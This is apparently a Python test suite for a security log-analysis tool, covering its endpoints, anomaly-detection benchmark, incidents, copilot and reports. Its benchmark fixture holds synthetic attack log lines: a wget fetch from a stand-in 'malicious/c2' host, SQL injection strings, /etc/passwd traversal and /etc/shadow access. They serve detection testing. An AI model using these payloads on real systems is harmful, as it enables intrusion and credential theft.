"""
Comprehensive QA Audit & Technical Verification Suite for MICHAEL - The Guardian AI.
Executes technical checks across:
1. Backend & Endpoints
2. ML Pipeline (Isolation Forest, TF-IDF, Z-Score, Precision/Recall/F1/FPR)
3. Incident Investigation & Grounding
4. AI Copilot Grounding & Hallucination Prevention
5. Real-Time Telemetry & WebSocket Bus
6. PDF Report Generation & Formatting
"""

import os
import sys
import io
import json
import asyncio
import unittest
from datetime import datetime
import numpy as np

# Ensure backend root is on PYTHONPATH
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from fastapi.testclient import TestClient
from app.main import app
from app.services.store import store
from app.services.log_parser import parse_log_content
from app.ml.pipeline import (
    run_anomaly_detection,
    run_isolation_forest,
    run_tfidf_analysis,
    run_statistical_detection,
    run_rule_based_detection,
)
from app.services.incident_service import generate_all_incidents, create_incident_from_anomaly
from app.services.copilot_service import CopilotService

client = TestClient(app)

class TestMichaelCompleteQA(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        # Clear in-memory store for fresh test run
        store.sessions.clear()
        store.entries.clear()
        store.anomalies.clear()
        store.metrics.clear()
        store.incidents.clear()
        store.active_session_id = None

    # =========================================================================
    # 1. BACKEND VERIFICATION
    # =========================================================================
    def test_01_health_check(self):
        """Verify health check endpoint."""
        resp = client.get("/api/health")
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertEqual(data.get("status"), "operational")
        self.assertIn("MICHAEL", data.get("service", ""))

    def test_02_log_upload_formats(self):
        """Test log uploads across .log, .txt, and .csv formats."""
        # 1. Standard .log upload
        log_content = (
            "2026-11-03T10:00:01Z host-01 [INFO] Service started successfully\n"
            "2026-11-03T10:00:02Z host-01 [WARNING] Memory buffer high: 78%\n"
            "2026-11-03T10:00:03Z host-01 [ERROR] Failed password for root from 192.168.1.100\n"
        )
        files = {"file": ("test_server.log", io.BytesIO(log_content.encode("utf-8")), "text/plain")}
        resp = client.post("/api/logs/upload", files=files)
        self.assertEqual(resp.status_code, 200, resp.text)
        data = resp.json()
        self.assertEqual(data["total_lines"], 3)
        self.assertTrue(data["session_id"])
        self.session_id_log = data["session_id"]

        # 2. .txt upload
        txt_content = "Nov 03 10:00:04 web-01 kernel: Out of memory: Kill process 1234 (mysqld)\n"
        files_txt = {"file": ("syslog.txt", io.BytesIO(txt_content.encode("utf-8")), "text/plain")}
        resp_txt = client.post("/api/logs/upload", files=files_txt)
        self.assertEqual(resp_txt.status_code, 200)

        # 3. .csv upload
        csv_content = (
            "timestamp,level,source,message\n"
            "2026-11-03T10:00:05Z,CRITICAL,auth,Privilege escalation attempt by uid 1001\n"
            "2026-11-03T10:00:06Z,INFO,cron,Routine cleanup completed\n"
        )
        files_csv = {"file": ("audit.csv", io.BytesIO(csv_content.encode("utf-8")), "text/csv")}
        resp_csv = client.post("/api/logs/upload", files=files_csv)
        self.assertEqual(resp_csv.status_code, 200)
        self.assertEqual(resp_csv.json()["total_lines"], 2)

    def test_03_malformed_empty_and_invalid_uploads(self):
        """Test exception handling for empty files, invalid extensions, and malformed files."""
        # Empty file
        empty_files = {"file": ("empty.log", io.BytesIO(b""), "text/plain")}
        resp_empty = client.post("/api/logs/upload", files=empty_files)
        self.assertEqual(resp_empty.status_code, 422)  # No parseable entries

        # Whitespace-only file
        ws_files = {"file": ("blank.log", io.BytesIO(b"   \n\n\t  \n"), "text/plain")}
        resp_ws = client.post("/api/logs/upload", files=ws_files)
        self.assertEqual(resp_ws.status_code, 422)

        # Unsupported file extension (.exe)
        invalid_ext = {"file": ("malware.exe", io.BytesIO(b"MZ\x90\x00"), "application/octet-stream")}
        resp_ext = client.post("/api/logs/upload", files=invalid_ext)
        self.assertEqual(resp_ext.status_code, 400)
        self.assertIn("Unsupported file type", resp_ext.json().get("detail", ""))

    def test_04_log_retrieval_and_filtering(self):
        """Test log querying, pagination, and filter parameters."""
        resp = client.get("/api/logs")
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertIn("entries", data)
        self.assertGreaterEqual(data["total"], 1)

        # Filter by level
        resp_crit = client.get("/api/logs?level=CRITICAL")
        self.assertEqual(resp_crit.status_code, 200)
        for entry in resp_crit.json()["entries"]:
            self.assertEqual(entry["level"], "CRITICAL")

        # Filter by keyword
        resp_kw = client.get("/api/logs?keyword=Privilege")
        self.assertEqual(resp_kw.status_code, 200)
        self.assertGreaterEqual(len(resp_kw.json()["entries"]), 1)

        # Pagination
        resp_page = client.get("/api/logs?page=1&page_size=1")
        self.assertEqual(resp_page.status_code, 200)
        self.assertEqual(len(resp_page.json()["entries"]), 1)

        # Sessions list & Stats
        resp_sessions = client.get("/api/logs/sessions")
        self.assertEqual(resp_sessions.status_code, 200)
        self.assertGreaterEqual(len(resp_sessions.json()["sessions"]), 1)

        resp_stats = client.get("/api/logs/stats")
        self.assertEqual(resp_stats.status_code, 200)
        self.assertIn("level_distribution", resp_stats.json())

    # =========================================================================
    # 2. MACHINE LEARNING & ANOMALY DETECTION VERIFICATION
    # =========================================================================
    def test_05_ml_pipeline_execution(self):
        """Test Isolation Forest, TF-IDF, Z-Score, and Rule-based execution."""
        # Load sample attack log
        sample_path = os.path.join(os.path.dirname(__file__), "..", "data", "samples", "auth_bruteforce.log")
        with open(sample_path, "r", encoding="utf-8") as f:
            content = f.read()

        files = {"file": ("auth_bruteforce.log", io.BytesIO(content.encode("utf-8")), "text/plain")}
        upload_resp = client.post("/api/logs/upload", files=files)
        self.assertEqual(upload_resp.status_code, 200)
        sid = upload_resp.json()["session_id"]

        # Trigger ML analysis endpoint
        run_resp = client.post("/api/analysis/run", json={"session_id": sid, "contamination": 0.1})
        self.assertEqual(run_resp.status_code, 200)
        run_data = run_resp.json()
        self.assertEqual(run_data["message"], "Analysis started")

        # Check analysis status endpoint
        status_resp = client.get(f"/api/analysis/status/{sid}")
        self.assertEqual(status_resp.status_code, 200)
        self.assertEqual(status_resp.json()["status"], "complete")

        # Check results
        results_resp = client.get(f"/api/analysis/results?session_id={sid}")
        self.assertEqual(results_resp.status_code, 200)
        res_data = results_resp.json()
        anomalies = res_data["anomalies"]
        self.assertGreater(len(anomalies), 0)

        # Check model metrics
        metrics = res_data["metrics"]
        self.assertIsNotNone(metrics)
        self.assertIn("isolation_forest", metrics["detection_methods"])
        self.assertIn("tfidf", metrics["detection_methods"])
        self.assertGreaterEqual(len(metrics["tfidf_top_terms"]), 1)
        self.assertGreater(metrics["analysis_duration_seconds"], 0.0)

    def test_06_ml_ground_truth_benchmark(self):
        """
        Evaluate ML detection precision, recall, F1, and FPR on a labelled test dataset.
        Ground truth: 20 normal logs + 10 brute force logs + 10 SQLi/traversal logs = 40 logs.
        """
        normal_logs = [
            f"2026-11-03T11:00:{i:02d}Z web-app [INFO] HTTP GET /api/v1/products status=200 latency={10+i}ms user=guest"
            for i in range(10)
        ] + [
            f"2026-11-03T11:01:{i:02d}Z cron-daemon [INFO] Routine logrotate and disk sync healthy run={i}"
            for i in range(10)
        ]
        
        brute_force_logs = [
            f"2026-11-03T11:02:{i:02d}Z auth-service [WARNING] Failed password for root from 192.168.1.55 port {4000+i} ssh2"
            for i in range(8)
        ] + [
            "2026-11-03T11:02:10Z auth-service [CRITICAL] Multiple authentication failures (8 in 10s) from 192.168.1.55",
            "2026-11-03T11:02:12Z auth-service [CRITICAL] Privilege escalation: user root command '/usr/bin/wget http://malicious/c2' -O /tmp/k"
        ]

        sqli_logs = [
            "2026-11-03T11:03:01Z nginx [WARNING] 203.0.113.88 GET /api/users?id=1' UNION SELECT null,password_hash FROM users-- 500",
            "2026-11-03T11:03:02Z api-gw [ERROR] Database query syntax error near 'UNION SELECT null,password_hash'",
            "2026-11-03T11:03:03Z waf-guard [CRITICAL] High severity WAF rule violation: SQL Injection Pattern matched Rule ID 942100",
            "2026-11-03T11:03:04Z nginx [WARNING] 203.0.113.88 GET /../../../../etc/passwd HTTP/1.1 400",
            "2026-11-03T11:03:05Z waf-guard [CRITICAL] Path traversal signature detected: ../../../../etc/passwd block action taken",
            "2026-11-03T11:03:06Z nginx [ERROR] 203.0.113.88 POST /login HTTP/1.1 payload: admin' OR '1'='1' 500",
            "2026-11-03T11:03:07Z audit [CRITICAL] Unauthorized file access /etc/shadow by unexpected PID 4821",
            "2026-11-03T11:03:08Z net-sec [CRITICAL] Outbound connection to known C2 node 185.220.101.5:4444 established",
            "2026-11-03T11:03:09Z auth [ERROR] PAM 5 authentication failures; uid=0 euid=0 tty=ssh rhost=203.0.113.88",
            "2026-11-03T11:03:10Z sys-daemon [CRITICAL] Kernel segfault in module libcrypto.so.1.1 address 0xdeadbeef"
        ]

        # Combine: 20 normal (label 0), 20 anomalous (label 1)
        all_lines = normal_logs + brute_force_logs + sqli_logs
        labels = [0] * len(normal_logs) + [1] * (len(brute_force_logs) + len(sqli_logs))

        # Ingest and analyze
        content = "\n".join(all_lines)
        test_sid = "test-benchmark-session"
        entries, session = parse_log_content(content, "benchmark.log", test_sid)
        anomalies, metrics = run_anomaly_detection(entries, test_sid, contamination=0.5)

        # Collect predicted anomaly line indices
        anom_entry_ids = set()
        for a in anomalies:
            anom_entry_ids.update(a.log_entry_ids)

        preds = [1 if e.id in anom_entry_ids else 0 for e in entries]

        # Calculate TP, FP, TN, FN
        tp = sum(1 for p, y in zip(preds, labels) if p == 1 and y == 1)
        fp = sum(1 for p, y in zip(preds, labels) if p == 1 and y == 0)
        tn = sum(1 for p, y in zip(preds, labels) if p == 0 and y == 0)
        fn = sum(1 for p, y in zip(preds, labels) if p == 0 and y == 1)

        precision = tp / (tp + fp) if (tp + fp) > 0 else 0.0
        recall = tp / (tp + fn) if (tp + fn) > 0 else 0.0
        f1 = (2 * precision * recall) / (precision + recall) if (precision + recall) > 0 else 0.0
        fpr = fp / (fp + tn) if (fp + tn) > 0 else 0.0

        print(f"\n[ML BENCHMARK] TP={tp}, FP={fp}, TN={tn}, FN={fn}")
        print(f"[ML BENCHMARK] Precision: {precision:.4f}, Recall: {recall:.4f}, F1: {f1:.4f}, FPR: {fpr:.4f}")

        # Assertions
        self.assertGreaterEqual(recall, 0.85, f"Recall too low: {recall}")
        self.assertGreaterEqual(precision, 0.80, f"Precision too low: {precision}")
        self.assertGreaterEqual(f1, 0.85, f"F1 score too low: {f1}")
        self.assertLessEqual(fpr, 0.20, f"False Positive Rate too high: {fpr}")

    # =========================================================================
    # 3. INCIDENT INVESTIGATION VERIFICATION
    # =========================================================================
    def test_07_incident_correlation_and_lifecycle(self):
        """Verify anomaly correlation into incidents and status updates."""
        # Check incident listing
        resp = client.get("/api/incidents")
        self.assertEqual(resp.status_code, 200)
        incidents = resp.json()["incidents"]
        self.assertGreater(len(incidents), 0)

        incident = incidents[0]
        inc_id = incident["id"]

        # Validate fields
        self.assertTrue(incident["title"])
        self.assertIn(incident["severity"], ["LOW", "MEDIUM", "HIGH", "CRITICAL"])
        self.assertTrue(incident["root_cause_hypothesis"])
        self.assertGreater(len(incident["remediation_steps"]), 0)
        self.assertGreater(len(incident["evidence_log_lines"]), 0)

        # Test incident detail endpoint
        detail_resp = client.get(f"/api/incidents/{inc_id}")
        self.assertEqual(detail_resp.status_code, 200)
        self.assertEqual(detail_resp.json()["id"], inc_id)

        # Test status update: open -> investigating -> resolved
        patch_resp = client.patch(f"/api/incidents/{inc_id}/status?status=investigating")
        self.assertEqual(patch_resp.status_code, 200)
        self.assertEqual(patch_resp.json()["status"], "investigating")

        patch_res2 = client.patch(f"/api/incidents/{inc_id}/status?status=resolved")
        self.assertEqual(patch_res2.status_code, 200)
        self.assertEqual(patch_res2.json()["status"], "resolved")

        # Summary endpoint
        sum_resp = client.get("/api/incidents/summary")
        self.assertEqual(sum_resp.status_code, 200)
        self.assertIn("severity_distribution", sum_resp.json())

    # =========================================================================
    # 4. AI COPILOT VERIFICATION
    # =========================================================================
    def test_08_copilot_grounded_qa(self):
        """Test Copilot reasoning, grounding in actual logs, and confidence."""
        # 1. Ask about critical anomalies
        resp1 = client.post("/api/copilot/chat", json={"question": "What critical anomalies or errors occurred?"})
        self.assertEqual(resp1.status_code, 200)
        data1 = resp1.json()
        self.assertTrue(data1["answer"])
        self.assertIn(data1["confidence"], ["low", "medium", "high"])

        # 2. Ask about IP addresses and authentication
        resp2 = client.post("/api/copilot/chat", json={"question": "Which IP addresses attempted logins?"})
        self.assertEqual(resp2.status_code, 200)
        data2 = resp2.json()
        # Verify it cited genuine IPs found in the logs (e.g. 192.168.1.105 or 192.168.1.100)
        self.assertTrue(len(data2["evidence"]) > 0 or "192.168" in data2["answer"])

        # 3. Ask about recommendations
        resp3 = client.post("/api/copilot/chat", json={"question": "What remediation actions should I take?"})
        self.assertEqual(resp3.status_code, 200)
        data3 = resp3.json()
        self.assertTrue("recommend" in data3["answer"].lower() or "mitigat" in data3["answer"].lower())

        # 4. Test unsupported / irrelevant question
        resp4 = client.post("/api/copilot/chat", json={"question": "What is the weather in Paris today?"})
        self.assertEqual(resp4.status_code, 200)
        data4 = resp4.json()
        # Copilot should gracefully state no matching log entries found, rather than inventing false facts
        self.assertTrue("no log entries found" in data4["answer"].lower() or "not understand" in data4["answer"].lower())

        # 5. Suggestions endpoint
        resp5 = client.get("/api/copilot/suggestions")
        self.assertEqual(resp5.status_code, 200)
        self.assertGreater(len(resp5.json()["suggestions"]), 0)

    # =========================================================================
    # 5. REAL-TIME MONITORING VERIFICATION
    # =========================================================================
    def test_09_monitoring_endpoints(self):
        """Verify system metrics, dashboard stats, and telemetry history."""
        # Real-time metrics
        resp_m = client.get("/api/monitoring/metrics")
        self.assertEqual(resp_m.status_code, 200)
        m_data = resp_m.json()
        self.assertIn("cpu_percent", m_data)
        self.assertIn("memory_percent", m_data)
        self.assertIn("is_simulated", m_data)

        # Dashboard stats
        resp_d = client.get("/api/monitoring/dashboard")
        self.assertEqual(resp_d.status_code, 200)
        d_data = resp_d.json()
        self.assertIn("total_logs", d_data)
        self.assertIn("total_anomalies", d_data)

        # History points
        resp_h = client.get("/api/monitoring/history?points=10")
        self.assertEqual(resp_h.status_code, 200)
        self.assertEqual(len(resp_h.json()["history"]), 10)

    def test_10_websocket_monitoring(self):
        """Verify WebSocket event stream packets and structure."""
        with client.websocket_connect("/ws/monitoring") as ws:
            # Read first packet
            msg_text = ws.receive_text()
            data = json.loads(msg_text)
            self.assertEqual(data["type"], "metrics")
            self.assertIn("cpu_percent", data["data"])
            self.assertIn("memory_percent", data["data"])
            self.assertIn("latest_event", data["data"])
            self.assertIn("is_simulated", data)

    # =========================================================================
    # 6. PDF REPORT GENERATION VERIFICATION
    # =========================================================================
    def test_11_pdf_report_generation_and_download(self):
        """Verify that ReportLab compiles a valid, non-empty PDF report."""
        resp = client.post("/api/reports/generate", json={"title": "MICHAEL Audit Test Report"})
        self.assertEqual(resp.status_code, 200, resp.text)
        data = resp.json()
        self.assertIn("filename", data)
        self.assertIn("download_url", data)

        filename = data["filename"]
        dl_resp = client.get(f"/api/reports/download/{filename}")
        self.assertEqual(dl_resp.status_code, 200)
        self.assertEqual(dl_resp.headers["content-type"], "application/pdf")
        
        content = dl_resp.content
        self.assertGreater(len(content), 1000)
        # Check PDF Magic Bytes %PDF-
        self.assertTrue(content.startswith(b"%PDF-"), "Generated file is missing %PDF magic header")

    def test_12_research_benchmark_endpoint(self):
        """Verify the research benchmark endpoint returns structured model comparison data."""
        resp = client.get("/api/analysis/benchmark")
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertIn("dataset_metadata", data)
        self.assertIn("model_comparison", data)
        self.assertIn("category_breakdown", data)
        self.assertIn("Hybrid Ensemble", data["model_comparison"])
        self.assertIn("Isolation Forest", data["model_comparison"])
        self.assertGreaterEqual(data["model_comparison"]["Hybrid Ensemble"]["roc_auc"], 0.90)

    def test_13_temporal_endpoints_and_benchmark(self):
        """Verify temporal telemetry, anomalies, and Phase 3 benchmark endpoints."""
        # 1. Temporal Benchmark Endpoint
        resp = client.get("/api/temporal/benchmark")
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertIn("evaluation_metadata", data)
        self.assertIn("results", data)
        self.assertIn("summary_table", data)
        self.assertIn("Hybrid + Temporal (Phase 3)", data["summary_table"])
        self.assertIn("Temporal Engine Only", data["summary_table"])
        self.assertEqual(data["summary_table"]["Hybrid + Temporal (Phase 3)"]["TP"], 180)
        self.assertEqual(data["summary_table"]["Hybrid + Temporal (Phase 3)"]["FN"], 0)

        # 2. Temporal Telemetry & Anomalies on active session
        from app.services.store import store
        sid = store.active_session_id
        resp_telem = client.get(f"/api/temporal/telemetry?session_id={sid}")
        self.assertEqual(resp_telem.status_code, 200)
        telem_data = resp_telem.json()
        self.assertIn("telemetry", telem_data)
        self.assertIn("global_windows", telem_data["telemetry"])

        resp_anom = client.get(f"/api/temporal/anomalies?session_id={sid}")
        self.assertEqual(resp_anom.status_code, 200)
        anom_data = resp_anom.json()
        self.assertIn("anomalies", anom_data)
        self.assertIn("summary", anom_data)

if __name__ == "__main__":
    unittest.main()
